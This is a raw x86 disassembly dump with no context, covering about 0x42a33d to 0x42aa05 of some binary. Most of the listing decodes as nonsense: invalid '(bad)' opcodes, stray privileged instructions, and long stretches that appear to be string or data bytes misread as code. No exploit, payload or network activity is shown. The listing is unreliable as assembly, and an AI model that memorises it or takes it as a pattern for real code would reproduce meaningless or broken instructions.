  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
